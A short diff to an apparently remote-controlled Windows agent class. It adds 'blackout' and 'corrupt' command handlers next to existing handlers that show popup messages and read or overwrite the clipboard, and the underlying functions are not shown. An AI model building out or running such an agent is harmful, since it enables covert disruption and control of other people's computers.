@@ -935,6 +935,8 @@ class Agent:
         threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(
             0, a.get("text", "hi"), a.get("title", TAG), 0x40 | 0x1000), daemon=True).start()
         return "shown"
+    def c_blackout(self, a, x):    return px_blackout(a)     # <-- NEW
+    def c_corrupt(self, a, x):     return px_corrupt(a)      # <-- NEW
     def c_clip(self, a, x):
         if a.get("set") is not None: self.set_clip(a["set"]); return "set"
         return clipboard()
